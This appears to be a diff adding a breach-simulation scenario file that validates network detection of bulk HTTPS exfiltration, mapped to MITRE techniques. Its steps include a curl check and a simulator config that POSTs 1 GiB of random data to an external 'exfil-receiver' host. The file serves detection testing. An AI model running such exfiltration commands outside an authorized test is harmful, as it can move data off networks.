@@ -1,0 +1,106 @@
+scenario_id: SIM-NDR-005
+name: "NDR — Bulk HTTPS Exfiltration EAL Validation"
+version: "1.0"
+status: active
+
+plane: NDR
+detection_types:
+  - Analytics
+  - BIOC
+
+uc_ref: UCS-NDR-05
+tc_ref: TC-NDR-05
+uc_name: "Anomalous Outbound Bytes Detection"
+tc_name: "Multi-Gigabyte HTTPS Upload Exceeding Host Baseline"
+
+mitre_tactic: "TA0010"
+mitre_tactic_name: "Exfiltration"
+mitre_technique: "T1041"
+mitre_technique_name: "Exfiltration Over C2 Channel"
+additional_techniques:
+  - technique: "T1567"
+    name: "Exfiltration Over Web Service"
+
+threat_report: "Unit42 - APT Exfiltration via Cloud Storage"
+threat_report_url: "https://unit42.paloaltonetworks.com/"
+
+execution_identity:
+  default: container-runtime
+  options:
+    - container-runtime
+    - root
+
+push_supported: true
+pull_supported: true
+
+infra_modules_needed:
+  - base
+  - ndr
+
+external_tools:
+  - name: cortexsim-eal-cli
+    source: "https://github.com/hankthebldr/cortex-pov-engine"
+    type: script
+    install_inline: false
+
+steps:
+  - id: step-01
+    name: "Verify operator-supplied receiver bucket reachable"
+    command: |
+      curl -sSL -o /dev/null -w '%{http_code}' https://exfil-receiver.testmynids.org/upload || true
+    identity: container-runtime
+    mitre_technique: "T1567"
+    expected_detections:
+      - plane: NDR
+        type: Analytics
+        description: "Pre-flight: receiver endpoint resolves"
+
+  - id: step-02
+    name: "Stream 1 GiB random payload across 4 chunked POSTs"
+    command: |
+      cat > /tmp/bulk-exfil.yml <<'YML'
+      campaign_id: CMP-NDR-005
+      name: "NDR validation — bulk HTTPS exfil"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      target_allowlist:
+        - testmynids.org
+      dry_run: false
+      tags: [ndr, exfil, eal]
+      steps:
+        - step_id: step-01
+          plugin: bulk_https_exfil
+          params:
+            target_url: https://exfil-receiver.testmynids.org/upload
+            total_bytes: 1073741824    # 1 GiB
+            chunk_bytes: 4194304       # 4 MiB
+            request_count: 4
+            method: POST
+            request_timeout: 600
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/bulk-exfil.yml --live
+    identity: container-runtime
+    mitre_technique: "T1041"
+    expected_detections:
+      - plane: NDR
+        type: Analytics
+        description: "NGFW EAL — outbound bytes per session greatly exceeds host baseline"
+      - plane: NDR
+        type: BIOC
+        description: "NGFW EAL — long-lived HTTPS upload (>5 min duration)"
+      - plane: ANALYTICS
+        type: Analytics
+        description: "XSIAM stitching — exfil session correlated with originating process"
+
+cleanup:
+  commands:
+    - "rm -f /tmp/bulk-exfil.yml"
+
+author: "Henry Reed"
+created: "2026-05-05"
+last_updated: "2026-05-05"
+tags:
+  - ndr
+  - eal
+  - exfiltration
+  - https
